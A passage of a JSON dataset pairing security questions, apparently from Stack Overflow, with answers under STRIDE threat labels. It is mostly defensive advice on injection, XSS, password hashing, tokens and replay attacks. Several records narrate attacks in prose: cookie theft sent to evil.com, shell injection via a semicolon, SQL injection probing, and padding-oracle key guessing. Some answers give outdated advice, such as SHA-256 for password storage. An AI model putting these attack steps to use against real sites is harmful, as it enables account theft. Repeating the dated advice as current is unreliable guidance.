    "Threat": "T",
    "Attack": " So unless you have another XSS hole to inject such a form this vulnerability cannot be exploited. My question is if my conclusion that it cannot be exploited is true, or that im missing something? ",
    "Mitigation": " MrCrim wants to steal the login of someone that uses victim.net MrCrim notices that victim.net is running an ftp server on an unusual portMrCrim puts up a form on his own site, evil.comThe form contains the \"ftp commands\" in the form elements and its post action is to victim.netMrCrim writes a JS script that steals document.cookie from a site and hosts that script in a .js file on evil.com. It probably works by including the cookie string as part of an image source URL that is requested from evil.comOne of the \"ftp commands\" in MrCrim's form is constructed to write a small bit of JS that executes MrCrim's cookie-stealing scriptMrCrim tempts people to look at evil.com by posting links on forums and sending spam.UnsuspectingUser follows a link posted in his favourite forum and lands at evil.com. He  posts the form, not knowing of its evil and wily intentionsUnsuspectingUser is now on victim.net and Bam! the JS \"injected\" by the FTP server is executed and UnsuspectingUser's cookie for victim.net get's sent to evil.comProfit!  :-) "
  },
  {
    "Threat": "S",
    "Attack": " Sending to the Customer only over SSL comes to mind, but requires the Customer to run an SSL-enabled web server with a signed certificate.  Plus, to authenticate the Service (the client in this request) requires a client-side certificate.   But, SSL should handle encryption, man-in-the-middle, message signing, and replay attacks.   Even if you sign the message with a private/public key pair, you'll need to implement something to prevent replay attacks. ",
    "Mitigation": " Perhaps a better way would be to just notify them that they have something new, then have them hit your server to get the new thing. They can then simply poll your server and verify your SSL certificate.  You'll need to authenticate them on your side before you send them any data.  For the notification, you could simply post to them the a signed date and time of the latest notification. This way, even if that notification is replayed, they'll know since the time and date won't be newer than the last one. "
  },
  {
    "Threat": "S",
    "Attack": " What is your suggested solution for the threat of website UI spoofing? ",
    "Mitigation": " The key to this problem is identifying some difference between a request to the real site and a request to the spoof site.  The simplest difference is some cookie-based UI preference. A cookie set on your (real) site will only ever be returned to your site, and will never be sent to a spoof site. "
  },
  {
    "Threat": "S",
    "Attack": " Say, there's a SPA(android + webAPI), the client(android app) implemented openid connect implicit flow, and will communicate with resource sever(web api) using access token directly.The app redirects the end user to the openid provider firstly, and gains both the id token and access token.However, there's a malicious app which stole the access token and impersonate the client to communicate with the resource server. ",
    "Mitigation": " I don't think it can. As you say, OpenID Connect is about authenticating the end-user to the client. It doesn't say anything about authenticating the client to a resource server. The relationship between the client and a resource server is purely OAuth2 and all the resource server can usually do is check whether the access token was issued by the authorization server. [LINK] of the OAuth2 spec also discusses how the access token can be misused with the implicit grant.With the implicit grant there is no guarantee that the client is not malicious. It isnt even authenticated by the authorization server. This differs from the authorization code grant, where the client authenticates to the token endpoint directly. Even then though, with plain OAuth2 the client doesn't authenticate to the resource server, so the resource server doesn't know what client is sending the request.OAuth2 leaves out how the access token is implemented or validated, so depending on the details, the resource owner may be able to obtain more information from the token about which client requested the it. But with the implicit grant, you don't have any guarantees. "
  },
  {
    "Threat": "E",
    "Attack": " I would favor the latter because it seems to limit the attack vector -- if a mobile device is compromised, then the security of the whole system (e.g. all the network-authenticated pieces) stays intact. ",
    "Mitigation": " If you want strong security, encrypt the mobile device's copy using password-based encryption.   You could use the same password used to authenticate to the service, but in general, I'd avoid reusing the same key for different purposes. A better approach would be to have a master encryption password for the mobile device, which encrypts the mobile database as well as the \"password\" used to authenticate the user to the synchronization service. Note that the service authentication password could actually be a private key for SSL client-cert authentication, or a character-based password.  You'll have to evaluate the risk of having just one password, but in many cases, I think the convenience this offers the user, combined with the safety provided by one strong master password as opposed to two weak-but-easily-remembered passwords is a good balance.  Note that this approach will allow user whose service access has been revoked to continue to access their local copy, but without any new updates. You could include some notion of a time limit to be enforced by the mobile software, but a determined attacker could circumvent this.  If you just need toy security, your suggestion of storing the correct hash on the mobile device is adequate, and it really doesn't matter whether you hash the real password or an alternate, because if you use the right hash, it should take them a few billion years to find a password collision that would allow them to access the remote service.  "
  },
  {
    "Threat": "T",
    "Attack": " They all are some variation of the following injection attacks against a querystring variable (where 99999 represents a valid querystring value, the attack is appended to the value): ",
    "Mitigation": " At this point they're just fishing.  The script is looking for web sites that have both open injection vulnerabilities and access to the sysobjects table in sql server.  That table will provide a list of all tables and columns (and their types) in the database.  If the page actually returns a result rather than throwing an error, the script will log that for a future more detailed attack.  You'll eventually end up with malicious javascript code appended to every text (varchar, nvarchar, char, nchar, text) column of every row of every table in the entire db.  I think this is the more-likely option.It creates an expression that will always return true, perhaps allowing them bypass your authentication system.  This seems less likely, because the sysobjects reference makes it needlessly complex.  Also: they used [CODE] rather than [CODE]. "
  },
  {
    "Threat": "T",
    "Attack": " Am I reasonably safe if I use this (or something similar), to protect from malicious code, or am I stuck with writing my own parser? Does anyone know of any better alternatives? ",
    "Mitigation": " Furthermore, the environment is very restricted (you cannot pass in modules), thus, you can't simply pass in a module of utility functions like re or random.  On the other hand, you don't need to write your own parser, you could just write your own evaluator for the python ast:  [CODE]  That way, hopefully, you could implement safe imports. The other idea is to use Jython or IronPython and take advantage of Java/.Net sandboxing capabilities. "
  },
  {
    "Threat": "S",
    "Attack": " However, the obvious security hole here is that the short lived access token is still perfectly valid for the next 10 minutes. And 10 minutes, no matter how short a time, is still plenty of time for a malicious user to cause some damage.  ",
    "Mitigation": " The solution I chose to go with is using a shared in memory database/cache.  I've evaluated Cassandra, Redis, and Apache Ignite and for the time being, decided to use Ignite.  Because I am not sure how it will perform once this goes to production, I've made the components easily swappable for another in memory solution in case the performance is not sufficient.  I have a JWT filter responsible for validating each request, at the end of which I make a call to the shared cache to check a access token revocation list.  I anticipate the list will be empty the vast majority of the time.  To further reduce potential performance degradation, I hash to tokens to about 40 characters using MD5 before revoking them.  This capability allows me to have an hour long access token life and a refresh token with an 18 hour life without worry that I won't be able to remove a malicious user if the need should arise. "
  },
  {
    "Threat": "E",
    "Attack": " My concern is that a malicious user would see the url and try to do something like \"[CODE]\" and gain access to a file which is not in the \"sample\" directory. ",
    "Mitigation": " Call  [CODE]  Then check that the resulting path starts with the directory you're expecting. "
  },
  {
    "Threat": "T",
    "Attack": " It'd be really nice to be able to prevent monkey-patching of Foo::BarImpl.  That way, people who rely on the library know that nobody has messed with it.  Imagine if somebody changed the implementation of MD5 or SHA1 on you!  I can call [CODE] on these classes, but I have to do it on a class-by-class basis, and other scripts might modify them before I finish securing my application if I'm not very careful about load order. ",
    "Mitigation": " Check out [LINK] by Garry Dolley.  You can prevent redefinition of individual methods. "
  },
  {
    "Threat": "E",
    "Attack": " I'm doing some work with this right now and I have to say, it makes no sense at all to me! Basically, I have some CDN server which provides css, images ect for a site. For whatever reason, in order for my browser to stop blocking those resources with a CORS error, I had to have that server (the CDN) add the Access-Control-Allow-Origin header. But as far as I can tell that does absolutely nothing to increase security. Shouldn't the page I request which references those cross-domain resources be telling the browser it's safe to get stuff from the other domain? If that were a malicious domain wouldn't it just have the Access-Control-Allow-Origin set to * so that sites load their malicious responses (you don't have to answer that because obviously they would)? ",
    "Mitigation": " If I have a protected resource hosted on site A, but also control sites B, C, and D, I may want to use that resource on all of my sites but still prevent anyone else from using that resource on theirs. So I instruct my site A to send [CODE] along with all of its responses. It's up to the web browser itself to honor this and not serve the response to the underlying Javascript or whatever initiated the request if it didn't come from an allowed origin. Error handlers will be invoked instead. So it's really not for your security as much as it's an honor-system (all major browsers do this) access control method for servers. "
  },
  {
    "Threat": "T",
    "Attack": "",
    "Mitigation": " If you are not expecting that input, reject it.  You should always validate your inputs, and certainly discard anything outside of the expected range. If you already know that your URL's honestly won't be beyond a certain length then rejecting it before it gets to the application seems wise. "
  },
  {
    "Threat": "I",
    "Attack": " Edit: I accept the timing attack reduction but the error page part is what really seems bogus. This attack vector puts their data into viewstate. There's only 2 cases. Pass. Fail.  If the decryption key was not successfully guessed it will get a 500 error for the padding invalid exception. At this point the attack application knows to increment the potential decryption key value and try again repeating until it finds the first successful 404 from the WebResource.axd / ScriptResource.axd  After having successfully deduced the decryption key this can be used to exploit the site to find the actual machine key. ",
    "Mitigation": " re:How does this have relevance on whether they're redirected to a 200, 404 or 500? No one can answer this, this is the fundamental question. Which is why I call shenanigans on needing to do this tom foolery with the custom errors returning a 200. It just needs to return the same 500 page for both errors.I don't think that was clear from the original question, I'll address it:who said the errors need to return 200? that's wrong, you just need all the errors to return the same code, making all errors return 500 would work as well. The config proposed as a work around just happened to use 200.If you don't do the workaround (even if its your own version that always returns 500), you will see 404 vs. 500 differences. That is particularly truth in webresource.axd and scriptresource.axd, since the invalid data decrypted is a missing resource / 404.Just because you don't know which feature had the issue, doesn't mean there aren't features in asp.net that give different response codes in different scenarios that relate to padding vs. invalid data. Personally, I can't be sure if there is any other feature that gives different response code as well, I just can tell you those 2 do.<hr />Can someone explain why returning the same error page and same status code for custom errors matters? I find this to be immaterial especially if this is advocated as part of the work around to it.Sri already answered that very clearly in the question you linked to.Its not about hiding than an error occurred, is about making sure the attacker can't tell the different between errors. Specifically is about making sure the attacker can't determine if the request failed because it couldn't decrypt /padding was invalid, vs. because the decrypted data was garbage.You could argue: well but I can make sure it isn't garbage to the app. Sure, but you'd need to find a mechanism in the app that allows you to do that, and the way the attack works you Always need at least a tiny bit of garbage in the in message. Consider these:ScriptResource and WebResource both throw, so custom error hides it.View state is by default Not encrypted, so by default its Not involved the attack vector. If you go through the trouble of turning the encryption on, then you very likely set it to sign / validate it. When that's the case, the failure to decrypt vs. the failure to validate is the same, so the attacker again can't know.Auth ticket also signs, so its like the view state scenarioSession cookies aren't encrypted, so its irrelevantI posted [LINK] how the attack is getting so far like to be able to forge authentication cookies.Isn't it just as easy for the script/application to execute this attack and not specifically care whether or not it gets a http status code and more on the outcome? Ie doing this 4000 times you get redirected to an error page where on 4001 you stay on the same page because it didn't invalidate the padding?As mentioned above, you need to find a mechanism that behaves that way i.e. decrypted garbage stays on the same page instead of throwing an exception / and thus getting you to the same error page.Either Fail, they're on a page and the viewstate does not contain their data. No matter what you do here there is no way to remove the fail case because the page just will never contain their inserted data unless they successfully cracked the key. This is why I can't justify the custom errors usage having ANY EFFECT AT ALL.Or Pass, they're on a page and the viewstate contains their inserted data.Read what I mentioned about the view state above. Also note that the ability to more accurately re-encrypt is gained After they gained the ability to decrypt. That said, as mentioned above, by default view state is not that way, and when its on its usually accompanied with signature/validation. "
  },
  {
    "Threat": "T",
    "Attack": " I want to construct a transact sql script that will stop specified people from running certain commands against all databases:  ",
    "Mitigation": " If you're on SQL Server 2005 or 2008, the best answer is one that's already been given, and that's DDL triggers. A properly written DDL trigger will stop even someone who has sysadmin rights from performing any sort of DDL operation.  A sysadmin can disable a trigger to perform work, or the trigger can be written to allow certain people to perform work, so you still have the option to make modifications as required.   If you're on SQL Server 2000 (or below), your only recourse is to check security permissions for each login/user. Ultimately this is something that needs to be done even if you're on SQL Server 2005 or 2008, but there isn't a shortcut in the previous versions. "
  },
  {
    "Threat": "S",
    "Attack": " One weakness I see in this is that the BAD GUY who was listening to the exchange, while he doesn't have A, now has a known ciphertext/plaintext combo, which I remember from crypto class is a BAD IDEA.  I figure some salting could alleviate this somehow? ",
    "Mitigation": " Server sends a random token to the client. Server stores the token in a \"pending\" list. These can be purged in some interval (eg: every 15 minutes)Client sends [CODE] back to the server, where [CODE] is some function that combines the username, password and the random token.Server gets the username and password back using [CODE] where [CODE] is the inverse of [CODE]. Server checks if the token is present in the pending list. If it's not, reject the login attempt. If it is, it server can proceed to perform authentication as usual. "
  },
  {
    "Threat": "T",
    "Attack": " So, members of my website can post topics, replies, comments, edit them and so on. I always use [CODE] and [CODE] for html inputs to protect my site against XSS and SQL injection attacks. Is it enough or is there something more I miss?Thanks.  There is a lot that can go wrong with a web application.   Other than XSS and SQLi,  there is: ",
    "Mitigation": " There is a whole family of vulnerabilities regarding [LINK] which is apart of the [LINK] that every web app programmer must read.  [LINK] is a good black paper that goes over many of these vulnerabilities that I have listed.   "
  },
  {
    "Threat": "T",
    "Attack": " Could an evil genius hacker inject SQL into my SELECT - How ? ",
    "Mitigation": " The solution, as already pointed out, is to use a prepared statement. This is the most reliable way to prevent SQL injection attacks. "
  },
  {
    "Threat": "T",
    "Attack": " Are there any pre-made scripts that I can use for PHP / MySQL to prevent server-side scripting and JS injections? ",
    "Mitigation": " Never output any bit of data whatsoever to the HTML stream that has not been passed through [CODE] and you're done. Simple rule, easy to follow, completely eradicates any XSS risk.  You can define  [CODE] "
  },
  {
    "Threat": "I",
    "Attack": " I am thinking of the following set up:Encrypt the whole database using TDE. Users are created in the SQL Server users table, and we authenticate against that when users log in through the web interface.The intention is that if someone gets to the database, they will not be able to use the data. And no connection string with user credentials will need to be stored in the [CODE] file. ",
    "Mitigation": " 1)Software generated keys are crackable, it is just a matter of persistence/desire vs. time threshold. The real security can be assured only by hardware generated and hardware stored keys. So, shared hosting is out of consideration2)You may want to consider to abandon DBMS encryption and encrypt data on client side.Though this approach has disadvantages that you cannot use SQL Server for searching, optimizing transmission, processing, etc. on server side. Then, what is the point in such DBMS?   "
  },
  {
    "Threat": "S",
    "Attack": " If eavesdropped, then an attacker could take the hash and replay it, leaving this scheme open to replay attacks. However shouldn't the HTTPS connection protect me against eavesdropping?  Your idea of the hash is a good start.  From there, you could also append the current timestamp to the pre-hashed value, and send that along as well.  If the given timestamp is more than 1 day different from the server's current time, disallow access.  This stops replay attacks for more than a day later anyway. ",
    "Mitigation": " Your idea of the hash is a good start.  From there, you could also append the current timestamp to the pre-hashed value, and send that along as well.  If the given timestamp is more than 1 day different from the server's current time, disallow access.  This stops replay attacks for more than a day later anyway.  Another option would be to use a nonce.  Anybody can request a nonce from your server, but then the device has to append that to the pre-hash data before sending the hash to the server.  Generated nonces would have to be stored, or, could simply be the server's current timestamp.  The device then has to append the server's timestamp instead of its own timestamp to the pre-hashed data, allowing for a much shorter period than a full day for a replay attack to occur. "
  },
  {
    "Threat": "I",
    "Attack": " Is there anyway where I can have the same way of encrypting the coredata so it makes it hard for hackers to get into the data.   ",
    "Mitigation": " What you might consider, if this is a real concern for you, is to build your own persistent store type - the Guide has a [LINK] on creating your own atomic store, and refers you to the [LINK] document. Build a store that takes some key from a user prompt at startup, then initializes with that key for encryption and decryption purposes. (Note that if you take this route, the [LINK] class reference says that subclassing NSPersistentStore directly is not supported in Core Data - you should subclass NSAtomicStore instead.) "
  },
  {
    "Threat": "I",
    "Attack": " My concern is that cryptographic keys and secrets that are managed by the garbage collector may be copied and moved around in memory without zeroization. ",
    "Mitigation": " The best strategy, as a developer, would be to drop the crypto library down into C (or any other non-managed language) and implement your stuff there. "
  },
  {
    "Threat": "E",
    "Attack": " I have a Django application I'm developing that must make a system call to an external program on the server. In creating the command for the system call, the application takes values from a form and uses them as parameters for the call. I suppose this means that one can essentially use bogus parameters and write arbitrary commands for the shell to execute (e.g., just place a semicolon and then [CODE]). ",
    "Mitigation": " Based on my understanding of the question, I'm assuming you aren't letting the users specify commands to run on the shell, but just arguments to those commands.  In this case, you can avoid [LINK] attacks by using the [LINK] module and not using the shell (i.e. specify use the default [CODE] parameter in the [CODE] constructor.  Oh, and never use [CODE] for any strings containing any input coming from a user. "
  },
  {
    "Threat": "I",
    "Attack": " I choose not to just rely on javascript, as the client-side is never a secure place. I have gotten into the habit of writing both the client and server-side code for such things. However, for a web application that I am writing that has optional AJAX, I do not want the password to be send plaintext over the wire if someone has javascript turned off. ",
    "Mitigation": " SSL Solves this problem. For the record,  passwords should never be \"encrypted\"  or \"encoded\", this employs that there is a method of \"Decoding\"  or \"Decrypting\"  which is a clear violation if [LINK]. Passwords must be hashed, SHA-256 is a great choice, but this is not meant for transmission, only storage.  When you transit secrets there is a long list of things that can go wrong,  SSL is by far the best choice for solving these issues.    "
  },
  {
    "Threat": "I",
    "Attack": " I choose not to just rely on javascript, as the client-side is never a secure place. I have gotten into the habit of writing both the client and server-side code for such things. However, for a web application that I am writing that has optional AJAX, I do not want the password to be send plaintext over the wire if someone has javascript turned off.  I realize I may be asking a catch-22 situation, so let me just ask this: how do we know our users' passwords will be secure (enough) from malicious users on the same network when all we can rely on is server-side scripting. On that first request from the login page, is there any way to have the browser encrypt a data field? ",
    "Mitigation": " SSL Solves this problem. For the record,  passwords should never be \"encrypted\"  or \"encoded\", this employs that there is a method of \"Decoding\"  or \"Decrypting\"  which is a clear violation if [LINK]. Passwords must be hashed, SHA-256 is a great choice, but this is not meant for transmission, only storage.  When you transit secrets there is a long list of things that can go wrong,  SSL is by far the best choice for solving these issues.     If the attacker can sniff the traffic then they will be able to see the session id and use it immediately,  so its a moot point.  You have to use SSL to protect the authenticated session anyway.  "
  },
  {
    "Threat": "T",
    "Attack": " I've been reading up on rails security concerns and the one that makes me the most concerned is mass assignment.  My application is making use of attr_accessible, however I'm not sure if I quite know what the best way to handle the exposed relationships is.  Let's assume that we have a basic content creation/ownership website.  A user can have create blog posts, and have one category associated with that blog post.  I allow mass-assignment on the category_id, so the user could nil it out, change it to one of their categories, or through mass-assignment, I suppose they could change it to someone else's category.  That is where I'm kind of unsure about what the best way to proceed would be. ",
    "Mitigation": " OK, so searched around a bit, and finally came up with something workable for me.  I like keeping logic  out of the controllers where possible, so this solution is a model-based solution:  [CODE]  I also found that rails 3.0 will have a better way to specify this instead of the 3 lines required for the ultra generic validates_each.  [LINK] "
  },
  {
    "Threat": "I",
    "Attack": " By inserting attacking code into his remote host or user agent or ect.  I mean attacker insert some attacking code    into his remote host or user agent or someware,   then I see that access log via web browser,   then my PC will be affected that code. ",
    "Mitigation": " You probably want some html formatting for the output and therefore have to sanitize/encode the log data. But for the arguments sake: If you send the output as text/plain the client isn't supposed to parse any html/javascript.E.g. the output of[CODE]displays as&lt;script&gt;alert(document.URL);&lt;/script&gt; (at least in FF3, IE8, opera, safari). "
  },
  {
    "Threat": "I",
    "Attack": "   This should not be done for POST forms  that target external URLs, since that  would cause the CSRF token to be  leaked, leading to a vulnerability.  The reason it's confusing is that; to me an \"external URL\" would be page on that isn't part of my domain (ie, I own www.example.com and put a form that posts to www.spamfoo.com. This obviously can't be the case since people wouldn't use Django for generating forms that post to other people's websites, but how could it be true that you can't use CSRF protection on public forms (like a login form)?    This should not be done for POST forms  that target external URLs, since that  would cause the CSRF token to be  leaked, leading to a vulnerability. ",
    "Mitigation": "   This should not be done for POST forms  that target external URLs, since that  would cause the CSRF token to be  leaked, leading to a vulnerability.  If you are posting a form to your domain, you'll want CSRF protection enabled by default, unless you have a specific reason to disable it (which should be more rare than not). "
  },
  {
    "Threat": "S",
    "Attack": " I can't find a configuration for this SALT value. It seems to be relying on one already present within the password stored in the database. Is there one or do I need to configure AUTH to do so since this login needs to be portable and reproducible? If it can't detect the salt, in the hash_password routine, it defaults to using uniqid(), which I don't believe is portable at all.In terms of adding users, does it make sense to modify the Auth library to add this feature? ie, introduce my own customized SALT that I can say, do an MD5 hash on that and then use that md5 generated by the salt to seed the password at given points in the md5sum?I'm no security expert, but is this overkill? Granted, it prevents someone who were to get access to the md5 password list from using a md5 lookup of predetermined hashes. If you have used the Kohana PHP framework, if you have any lessons learned or experiences after using it that might give insight as to the right approach for this problem, let me know. I'm reading numerous forums and wiki's about it, and there isn't a real concrete opinion yet that I've seen. I'm essentially trying to get a reproducible approach for authenticating someone in this site, both using PHP and eventually from a mobile device, like an iPhone. I'm also thinking of eventually adding support for google friend connect for openID support and integration. ",
    "Mitigation": " Problem 1. The salt configuration is stored in [CODE]. Find that file in [CODE], then in your [CODE] folder (as you might have already known, Kohana uses cascading file system mechanism). The default file, which you are encouraged to customize into [CODE] folder, looks like below:  [CODE]  Problem 2. In my opinion, the password hashing mechanism used by Auth, which is SHA1 with salt insertion, is quite secure provided you keep your salts, i.e. your [CODE] file, secure.  Problem 3. Auth built-in hashing mechanism uses SHA1, which is relatively more crack-proof than MD5, so I would say don't do the MD5 way, no matter how complicated your scheme might look. A security expert Thomas Ptacek in [LINK] wrote:    No, really. Use someone else\u9225\u6a9a  password system. Don\u9225\u6a9b build your own.    Most of the industry\u9225\u6a9a worst security  problems (like the famously bad LANMAN  hash) happened because smart  developers approached security code  the same way they did the rest of  their code.  Problem 4. Yup I'm using Kohana to build my small company website and some of our clients' website and so far I don't find any problem with the Auth module, although I can't say much since I haven't really used it for real security-concerned website. But in general, I'd say Kohana is an excellent framework especially with the cascading filesystem mechanism. "
  },
  {
    "Threat": "I",
    "Attack": " If I put this on a server running the standard LAMP setup, how could someone could find out [CODE]? ",
    "Mitigation": " If PHP were to fail somhow, then the page would be displayed as a plaint text file. That has happened before; it once happened to [LINK]. To protect against this you should store all sensitive variables (passwords, etc) in a php file which is not in the web root. You could store it in the parent folder (if you have access to it) or in a subfolder which is protected by apache ([CODE]). "
  },
  {
    "Threat": "I",
    "Attack": " Should role checks be done at the top of the stack, the bottom of the stack or at every level?  It seems that if a malicious user can invoke one method, he could invoke any, so for  effective security, you'd need a check on every method (and that's a lot of extra code to write). ",
    "Mitigation": " In my opinion, you should put it as close to the data as possible. The closer you are to the data, the better you can ensure that it isn't possible to take some circuitous route through your code base to circumvent an access check.  That argument would call for security checks being placed in either the data source itself, if it supports it (like your favorite RDBMS), or the data access layer.  However, some security constraints have a strong odour of business logic; e.g. \"if the user is in this role and attempting to modify data that meet these specifications, the operation should be allowed; otherwise not\". That sounds to me like a policy, and something that belongs either in the Business Logic layer of a separate Rules Engine of sorts.  [LINK]. "
  },
  {
    "Threat": "T",
    "Attack": " I recently made a simple game where user can submit his/her high scores online.It is very easy to hack the game by increasing high score by using software such as Cheat Engine. High score is stored in an integer. Should I store encrypted high score instead of an integer and decrypt it to show in the game? ",
    "Mitigation": " The summary is that while there are many methods to make cheating difficult, eventually somebody with enough time in their hands will bypass your security measures. The only way to make leader boards hacker proof is to run the game logic on the server. "
  },
  {
    "Threat": "E",
    "Attack": " Assuming a database is compromised a per user salt prevents the use of generic rainbow tables to crack passwords.  A separate rainbow table would have to be generated for each and every user who had a unique salt in order to obtain their password.  This would be a time consuming process which is what makes salts effective.  This does not help a tremendous amount against dictionary or brute force attacks.  Although a salt is not meant to be [LINK] wouldn't it still be more secure to place salts in a separate table?  That way even if the 'users' table was to become compromised the salts would not.Would having a 2nd hard-coded application wide salt add a tremendous amount of security?  This way even if the database is compromised, the actual application would also have to be compromised or both the salts and hashes would be completely useless.What is the best length for a salt?  Obviously the longer the better, however with larger numbers of users database size does become an issue, so what would be the minimum length for an effective salt be?Is using a 3rd party source for a \"true random salt\" (random.org, random.irb.hr) really needed?  I understand using a salt based off of server time is \"guessable\" to some extent however taking a random sub-string of a sha1'd random string seems like an effective salt method. ",
    "Mitigation": " If a hacker has access to your database system, you're fsckd.  Your system has to have access to both tables to run, so the likelihood of \"hiding\" one from a hacker who's already compromised the system is nearly zero.  Not remotely worth the extra complexity, in my opinion.Having a \"nonce\" added (in addition) to a salt for each password is not a great help, but doesn't really hurt anything either.Even 16 bits of salt is typically enough to make password cracking infeasible, if done correctly.  I would probably use 64 or 128 bits, why not?You should use a \"good\" source of randomness, but it doesn't need to be perfect.  If the random values are somehow visible to an attacker, then they may be able to find a way to predict the next random value, but they would have to do this when the password is created and it would only get them that one password.  In short, you need per-user salt and a good hashing function.  MD5 is terrible, and SHA-1 is no longer \"good\".  You should be using a system like bcrypt to force an attacker to spend a considerable fraction of a second on each hash.  0.1s per password check is probably no big deal to you, but it's devastating to any kind of brute-force cracking. "
  },
  {
    "Threat": "E",
    "Attack": " Of course the real processing of data still happens in the backend using PHP or some other language, and it is key that you make sure that nothing unwanted happens at that point. But just by looking at the .js of a site (that relies heavily on e.g. jQuery), it'll tell a person maybe more than you, as a developer, would like. Especially since every browser nowadays comes with a fairly extensive web developer environment or add-on. Even for a novice manipulating the DOM isn't that big of a deal anymore. And once you figure out what code there is, and how you might be able to influence it by editing the DOM, the 'fun' starts.  I don't want everyone to be able to look at a .js file and see exactly (or rather: for a large part) how my site, web app or CMS works \u9225?what is there, what it does, how it does it, etc.I'm worried that by 'unveiling' this information, people who are a lot smarter than I am figure out a way to manipulate the DOM in order to influence JavaScript functions they now know the site uses, possibly bypassing backend checks that I implemented (and thus wrongly assuming they were good enough). ",
    "Mitigation": " Nothing in your JavaScript should be a security risk, if you've set things up right. Attempting to access an AJAX endpoint one finds in a JavaScript file should check the user's permissions and fail if they don't have the right ones.  Having someone view your JavaScript is only a security risk if you're doing something broken like having calls to something like [CODE], in which case your issue isn't insecure JavaScript, it's insecure code. "
  },
  {
    "Threat": "T",
    "Attack": " My understanding is that when your APK is installed, it gets compiled and stored in the dalvik cache as an optimized dex file.  The dalvik cache is only accessible by the system user so unless the phone is rooted, there is no way an attacker can get to it.  If the phone is rooted (and the attacker is running as root), then the embedded dex file can still be tampered with since the attacker can then just modify the apk and re-sign it with their own key. ",
    "Mitigation": " Correct. By enabling this option you are forcing the system to run the dex code directly from the .apk file using a JIT compiler (Just like it was on dalvik before Android 4.4) instead of AOT (5+) or a combination of both (4.4-5). You cannot modify and run the dex code inside of an apk without re-signing it, and since you don't have the original signing key you would have to sign it with a different one. As an application developer you can implement code checking the apk signature and checksum and thus not allow running an apk that has been tampered with. What you have in dalvik cache on the other hand, are optimized versions of .dex files and precompiled .oat files which are not signed and thus having root privileges you can modify them. "
  },
  {
    "Threat": "E",
    "Attack": " but what about security? meybe hacker can find the way to change some of my [CODE] statements, and whole my securite will brake. ",
    "Mitigation": " You should send the username/password over HTTPS in an AJAX query and have the server respond with only the data required for the user to move on, not the whole username list. "
  },
  {
    "Threat": "E",
    "Attack": " I recently learned about Java's security model. Most people think Java is secure because it is immune to buffer overflows, etc, but there is this entire Java security model centered around checking whether code has permission to take certain actions. They're really solving a challenging problem: how to let arbitrary untrusted code (say in a web browser) run but be prevented from accessing the underlying system in malicious ways while retaining the ability to interact with the system in some ways. ",
    "Mitigation": " Perl has a really neat feature called taint mode ([CODE]). With that mode enabled, any variable that comes from the outside world (env vars, GET/POST data, etc.) is tainted, and any variable that touches a tainted variable is also tainted. Tainted variables can't be used in methods that touch the outside world (SQL, exec/system, etc). The only way to untaint a variable is to do a regex on it; any matched groups are untainted. Of course, you can get around taint mode by doing a regex for [CODE], but the idea is that you have to actively write bad code like that -- rather than just carelessly forgetting to sanitize your inputs -- if you're going to do something dumb like concatting user input straight into MySQL. "
  },
  {
    "Threat": "E",
    "Attack": " I'm playing around with django and built a small app where a user can access their info via the url [LINK] . I want to add the ability to edit that info through [LINK], but also want to make sure the currently logged in user (using django.contrib.auth) can access only his information. I accomplished this by doing the following in the view (username in the view args is captured from the url):  So, obviously, I don't want user 'johnny' to edit the info belonging to user 'jimmy' by simply pointing his browser to /jimmy/info/edit/. The above works, but my concern is that I'm missing something here as far as security goes. Is this the right way to go about this?Thanks. ",
    "Mitigation": " But, why show their username if no one else can see at least a profile or something at this location though? Wouldn't this be more like a 'account' page? Then you wouldn't check against the username in the url, the only url you could go to would be account, and it would just load the logged in user's info. "
  },
  {
    "Threat": "I",
    "Attack": " My concern is that we should never store a user password in a java.lang.String because they're immutable.  I can't zero out that String as soon as I'm done authenticating.  That object will sit in memory until the garbage collector runs.  That leaves open a much wider window for a bad guy to get a core dump or somehow otherwise observe the heap. ",
    "Mitigation": " The password is sent over the wire in plaintext.The password is sent repeatedly, for each request. (Larger attack window)The password is cached by the webbrowser, at a minimum for the length of the window / process. (Can be silently reused by any other request to the server, e.g. CSRF).The password may be stored permanently in the browser, if the user requests. (Same as previous point, in addition might be stolen by another user on a shared machine).Even using SSL, internal servers (behind of SSL protocol) will have access to plain text cacheable password.   At the same time, Java container has already parsed HTTP request and populate object. So, that's why you get String from request header. You probably should rewrite the Web Container to parse safety HTTP request. "
  },
  {
    "Threat": "S",
    "Attack": " How can I  guarantee that the request came from the local server, to stop malicious users visiting the doSomething.ashx page and making false requests? ",
    "Mitigation": " In the HttpRequest object, there is a property:  [CODE]  This boolean is true if the request has come from the same machine!  MSDN Docs:  [LINK] "
  },
  {
    "Threat": "I",
    "Attack": " I regularly use a standard form to send login information through the HTTP POST method and then validate it using php to check if the details are correct. I use an md5 hash on the passwords (and sometimes usernames) to give some degree of security, so I'm not storing a raw password in my code in case it's viewed by an unauthorised person, or something like that.  I've recently been working on a forum which has a MySQL database of users and passwords, the passwords are stored as md5 hashes, but I worry that when sending the login form via HTTP POST the possibility of the information being intercepted is there. I'm aware of the possibilities of MySQL injection attacks and think that I'm safe from any simple attacks. ",
    "Mitigation": " You would need to do a client-side hash of the password based on a challenge salt provided by the server. This challenge should be different for each request.  This way, even if the password hash is intercepted, it would not be usable for anything useful, since the next authentication would require a different hash.  Anyway, HTTPS should be the right and safe way. "
  },
  {
    "Threat": "I",
    "Attack": " I have an image in my AWS S3 bucket. Is it safe to include this image in my website by placing the AWS URL in an [CODE] tag? The URL includes parameters such as \"Amz-Signature\", \"Amz-Credential\", and \"amz-security-token. Could these be used maliciously to get to access other files in my S3 bucket? ",
    "Mitigation": " Do not make the bucket public. If you do, then potentially user1 could see user2's uploaded files.  You can allow users to retrieve single files for a specific period of time using pre-signed URLs.   Mark the S3 bucket as private.Use [CODE] to generate a pre-signed URL for the file you want the user to download.Use that URL in your [CODE] tag.  Using this technique is safe:  The user can only download the file during the timeframe that you permit, until the expiration date (which you set as part of the [CODE] call)The credentials you see in the URL are may be the same as those that were used to create the URL. But they are safe to show the user.The user cannot download any other files from the bucket.   The URL uses a hashing technique to ensure the URL cannot be modified, nor can it be abused to get other files.  If displaying the access key ID is a concern, you can either (a) create an IAM user specifically for the purpose of downloading the files from S3, or (b) use an IAM role on your EC2 instance to generate the pre-signed URL.  References:  [LINK] "
  },
  {
    "Threat": "T",
    "Attack": " I'm having to work on an old web app that a previous developer left. It is using addslashes() to prevent XSS on a HTTML attribute. ",
    "Mitigation": " No  The data just has to include a [CODE] and the attribute is broken out of.  Use [CODE] when you want to insert an arbitrary string into an attribute value. "
  },
  {
    "Threat": "D",
